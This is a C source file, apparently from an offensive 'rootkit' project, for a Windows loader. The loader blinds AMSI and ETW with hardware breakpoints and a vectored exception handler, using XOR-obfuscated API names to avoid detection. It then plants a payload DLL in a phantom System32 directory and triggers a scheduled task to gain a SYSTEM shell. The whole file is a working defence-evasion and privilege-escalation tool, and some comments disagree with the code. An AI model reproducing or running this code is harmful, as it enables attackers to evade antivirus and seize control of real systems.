/*
 * dark_room_annotated.c — Combined AMSI + ETW Bypass (Annotated)
 * ═══════════════════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 *
 * PURPOSE:
 *   Single loader that blinds BOTH AMSI (script scanning) and ETW
 *   (process telemetry) using hardware breakpoints. Creates the
 *   "dark room" where our tools operate without Defender seeing
 *   script content or process activity.
 *
 *   DR0 = AmsiScanBuffer  → returns E_INVALIDARG (0x80070057)
 *   DR1 = EtwEventWrite   → returns STATUS_SUCCESS (0)
 *
 *   Zero bytes modified. Zero VirtualProtect calls. Zero EtwTi alerts.
 *
 * PREREQUISITES:
 *   Finding #33: AMSI HWBP bypass confirmed (Engagement 7)
 *   Finding #35: ETW HWBP bypass confirmed (Engagement 8)
 *   Finding #36: Defender blind spot in CPU debug register monitoring
 *
 * COMPILE:
 *   cl.exe dark_room_annotated.c /Fe:dark_room.exe /O1 /GS-
 *
 * USAGE:
 *   dark_room.exe            (blind AMSI + ETW, spawn PowerShell)
 *   dark_room.exe --test     (blind both, verify, exit)
 *   dark_room.exe --check    (locate targets only)
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

#define XOR_KEY 0xD6

/* "amsi.dll" XOR 0x41 */
static const unsigned char xAmsiDll[] = {
    0xB7, 0xBB, 0xA5, 0xBF, 0xF8, 0xB2, 0xBA, 0xBA
};
#define xAmsiDll_LEN 8

/* "AmsiScanBuffer" XOR 0x41 */
static const unsigned char xAmsiScanBuffer[] = {
    0x97, 0xBB, 0xA5, 0xBF, 0x85, 0xB5, 0xB7, 0xB8,
    0x94, 0xA3, 0xB0, 0xB0, 0xB3, 0xA4
};
#define xAmsiScanBuffer_LEN 14

/* "ntdll.dll" XOR 0x41 */
static const unsigned char xNtdll[] = {
    0xB8, 0xA2, 0xB2, 0xBA, 0xBA, 0xF8, 0xB2, 0xBA,
    0xBA
};
#define xNtdll_LEN 9

/* "EtwEventWrite" XOR 0x41 */
static const unsigned char xEtwEventWrite[] = {
    0x93, 0xA2, 0xA1, 0x93, 0xA0, 0xB3, 0xB8, 0xA2,
    0x81, 0xA4, 0xBF, 0xA2, 0xB3
};
#define xEtwEventWrite_LEN 13

/* "powershell.exe" XOR 0x41 */
static const unsigned char xPowerShell[] = {
    0xA6, 0xB9, 0xA1, 0xB3, 0xA4, 0xA5, 0xBE, 0xB3,
    0xBA, 0xBA, 0xF8, 0xB3, 0xAE, 0xB3
};
#define xPowerShell_LEN 14

static void xor_decode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

static HANDLE hStdOut;
static void color(WORD c) { SetConsoleTextAttribute(hStdOut, c); }

#define RED     (FOREGROUND_RED | FOREGROUND_INTENSITY)
#define GREEN   (FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define YELLOW  (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define CYAN    (FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define WHITE   (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)

/* Global targets for VEH handler — both must be set before activating */
static volatile void *g_pAmsiScanBuffer = NULL;
static volatile void *g_pEtwEventWrite = NULL;

/* ═══════════════════════════════════════════════════════════════════
 * UNIFIED VEH HANDLER
 * ═══════════════════════════════════════════════════════════════════
 * Single handler for both breakpoints. Checks RIP against both
 * targets. DR0 fires for AMSI, DR1 fires for ETW — both generate
 * EXCEPTION_SINGLE_STEP, distinguished by the RIP value.
 * ═══════════════════════════════════════════════════════════════════ */

static LONG WINAPI DarkRoomHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    /* AMSI bypass: return E_INVALIDARG */
    if ((void *)pExInfo->ContextRecord->Rip == g_pAmsiScanBuffer) {
        pExInfo->ContextRecord->Rax = (DWORD64)0x80070057;
        pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
        pExInfo->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* ETW bypass: return STATUS_SUCCESS */
    if ((void *)pExInfo->ContextRecord->Rip == g_pEtwEventWrite) {
        pExInfo->ContextRecord->Rax = 0;
        pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
        pExInfo->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

/* ═══════════════════════════════════════════════════════════════════
 * RESOLVE TARGETS
 * ═══════════════════════════════════════════════════════════════════ */

static void *resolve_function(const unsigned char *xDll, int dllLen,
                               const unsigned char *xFunc, int funcLen,
                               int useGetModuleHandle) {
    HMODULE hMod;
    void *pFunc;
    unsigned char dllName[32];
    unsigned char funcName[64];

    memcpy(dllName, xDll, dllLen);
    xor_decode(dllName, dllLen);
    dllName[dllLen] = 0;

    memcpy(funcName, xFunc, funcLen);
    xor_decode(funcName, funcLen);
    funcName[funcLen] = 0;

    if (useGetModuleHandle)
        hMod = GetModuleHandleA((char *)dllName);
    else
        hMod = LoadLibraryA((char *)dllName);

    if (!hMod) return NULL;

    pFunc = (void *)GetProcAddress(hMod, (char *)funcName);

    memset(dllName, 0, sizeof(dllName));
    memset(funcName, 0, sizeof(funcName));

    return pFunc;
}

/* ═══════════════════════════════════════════════════════════════════
 * SET DUAL HARDWARE BREAKPOINTS
 * ═══════════════════════════════════════════════════════════════════
 * DR0 = AmsiScanBuffer (execution breakpoint)
 * DR1 = EtwEventWrite (execution breakpoint)
 *
 * DR7 encoding:
 *   Bit 0:     Local enable DR0
 *   Bit 2:     Local enable DR1
 *   Bits 16-17: DR0 condition (00 = execution)
 *   Bits 18-19: DR0 length (00 = 1 byte)
 *   Bits 20-21: DR1 condition (00 = execution)
 *   Bits 22-23: DR1 length (00 = 1 byte)
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL set_dual_hwbp(void *pAmsi, void *pEtw) {
    CONTEXT ctx;
    HANDLE hThread = GetCurrentThread();

    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(hThread, &ctx)) {
        color(RED);
        printf("  [!] GetThreadContext failed: %lu\n", GetLastError());
        return FALSE;
    }

    /* Set both breakpoints */
    ctx.Dr0 = (DWORD64)pAmsi;
    ctx.Dr1 = (DWORD64)pEtw;

    /* Clear condition/length bits for DR0 and DR1, set enables */
    ctx.Dr7 &= ~(0xFULL << 16);  /* Clear DR0 cond+len */
    ctx.Dr7 &= ~(0xFULL << 20);  /* Clear DR1 cond+len */
    ctx.Dr7 |= (1 << 0);          /* Enable DR0 locally */
    ctx.Dr7 |= (1 << 2);          /* Enable DR1 locally */

    if (!SetThreadContext(hThread, &ctx)) {
        color(RED);
        printf("  [!] SetThreadContext failed: %lu\n", GetLastError());
        return FALSE;
    }

    /* Verify */
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(hThread, &ctx);

    if (ctx.Dr0 == (DWORD64)pAmsi && ctx.Dr1 == (DWORD64)pEtw) {
        color(GREEN);
        printf("  [+] DR0 = 0x%p (AmsiScanBuffer)\n", pAmsi);
        printf("  [+] DR1 = 0x%p (EtwEventWrite)\n", pEtw);
        printf("  [+] DR7 = 0x%llX\n", (unsigned long long)ctx.Dr7);
        return TRUE;
    }

    color(RED);
    printf("  [!] DR register verification failed\n");
    return FALSE;
}

/* ═══════════════════════════════════════════════════════════════════
 * WEAPONIZED PAYLOAD
 * ═══════════════════════════════════════════════════════════════════ */

#include <shellapi.h>

// This function will contain the logic to plant the DLL and trigger the service
static void execute_phantom_dll_attack() {
    color(CYAN);
    printf("\n  --- PHASE 4: PHANTOM DLL PLANT ---\n\n");

    // Create the target directory
    if (!CreateDirectoryA("C:\\Windows\\System32\\spp\\store\\2.0", NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        color(RED);
        printf("  [!] Failed to create directory C:\\Windows\\System32\\spp\\store\\2.0\\. Error: %lu\n", GetLastError());
        return;
    }
    color(GREEN);
    printf("  [+] Created phantom directory.\n");

    // Copy the DLL
    // Assumes osppc.dll is in the same directory as this loader.
    if (!CopyFileA(".\\osppc.dll", "C:\\Windows\\System32\\spp\\store\\2.0\\osppc.dll", FALSE)) {
        color(RED);
        printf("  [!] Failed to copy osppc.dll. Error: %lu\n", GetLastError());
        if (GetLastError() == ERROR_ACCESS_DENIED) {
            printf("  [!] ACCESS DENIED. Defender likely blocked the write. Our blindfold may have failed.\n");
        }
        return;
    }
    color(GREEN);
    printf("  [+] Payload DLL planted successfully in C:\\Windows\\System32\\spp\\store\\2.0\\\n");

    // Trigger the service using schtasks
    color(CYAN);
    printf("\n  --- PHASE 5: TRIGGERING SERVICE ---\n\n");
    
    // Use system() as a simple, direct way to call schtasks.
    // Elevated privileges are not required to trigger a task you have rights to.
    system("schtasks /run /tn \"\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask\"");
    
    color(GREEN);
    printf("  [+] Service trigger sent. A SYSTEM shell should appear within 60 seconds.\n");
    printf("  [+] This loader will now exit.\n");
}

int main(int argc, char **argv) {
    void *pAmsi, *pEtw;
    PVOID hVeh;
    
    hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

#ifdef VDR_DEBUG
    color(CYAN);
    printf("\n  CHEYANNE DARK PHANTOM LOADER (v8)\n\n");
#endif

    /* PHASE 1: Locate both targets */
    printf("  --- PHASE 1: LOCATE TARGETS ---\n\n");

    pAmsi = resolve_function(xAmsiDll, xAmsiDll_LEN,
                             xAmsiScanBuffer, xAmsiScanBuffer_LEN, 0);
    pEtw = resolve_function(xNtdll, xNtdll_LEN,
                            xEtwEventWrite, xEtwEventWrite_LEN, 1);

    if (!pAmsi || !pEtw) {
        color(RED);
        printf("  [!] Failed to resolve required functions. Aborting.\n");
        return 1;
    }
    color(GREEN);
    printf("  [+] All targets resolved.\n");

    /* PHASE 2: Set dual hardware breakpoints */
    printf("\n  --- PHASE 2: ACTIVATE DARK ROOM ---\n\n");

    g_pAmsiScanBuffer = pAmsi;
    g_pEtwEventWrite = pEtw;

    hVeh = AddVectoredExceptionHandler(1, DarkRoomHandler);
    if (!hVeh) {
        return 1;
    }
    
    if (!set_dual_hwbp(pAmsi, pEtw)) {
        RemoveVectoredExceptionHandler(hVeh);
        return 1;
    }

    printf("\n  [+] DARK ROOM ACTIVE: This process is now blind to AMSI and ETW.\n");

    /* PHASE 3 & 4: Plant payload and trigger */
    execute_phantom_dll_attack();

    /* Cleanup VEH before exiting */
    RemoveVectoredExceptionHandler(hVeh);

#ifdef VDR_DEBUG
    color(WHITE);
    printf("\n  -- CHEYANNE DARK PHANTOM LOADER SESSION COMPLETE --\n\n");
#endif

    return 0;
}
